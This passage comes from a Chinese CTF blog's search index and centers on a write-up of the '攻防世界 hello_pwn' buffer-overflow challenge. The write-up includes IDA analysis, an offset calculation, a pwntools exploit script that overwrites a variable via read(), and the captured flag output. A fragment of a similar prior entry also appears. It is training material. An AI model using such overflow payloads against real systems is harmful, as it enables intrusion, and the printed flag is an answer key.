class="comment">#发送payload</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收远端服务器交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-hello_pwn</title>
      <link href="/2021/10/27/Note/"/>
      <url>/2021/10/27/Note/</url>
      
        <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p><p>下载附件，ida反编译并找出主函数：</p><p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p><p>看到read函数，初步判断是栈溢出题</p><p>进入sub函数查看：</p><p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p><p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p><p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p><p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p><p>对比一下：</p><p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p><p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p><p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p><p><img src="image-20211027224758038.png" alt="image-20211027224758038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
